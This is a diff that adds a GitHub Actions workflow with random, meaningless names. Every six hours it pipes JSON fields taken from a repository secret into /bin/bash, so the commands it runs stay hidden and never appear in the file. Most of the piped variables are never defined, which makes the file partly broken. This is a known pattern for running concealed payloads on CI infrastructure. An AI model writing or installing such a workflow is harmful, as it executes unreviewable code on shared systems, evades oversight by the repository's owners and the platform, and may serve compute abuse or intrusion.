@@ -1,0 +1,25 @@
+name: xudengdai1234
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '15 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xudengdai1234
+        env:
+          fk94537: ${{ secrets.fk94537 }}
+        run: |
+          echo $fk94537 | jq -r .fcus578 | /bin/bash
+          echo $bpbc93942 | jq -r .yt9037 | /bin/bash
+          echo $kl198 | jq -r .g95633 | /bin/bash
+          echo $e55059 | jq -r .addpj6167 | /bin/bash
+          echo $fmtgi7337 | jq -r .ezi5 | /bin/bash
+          echo $zbp314 | jq -r .a1 | /bin/bash
+          echo $tulr706 | jq -r .m19 | /bin/bash
+          echo $i252 | jq -r .wkwqr080 | /bin/bash
+          echo $yet82 | jq -r .z2 | /bin/bash
+
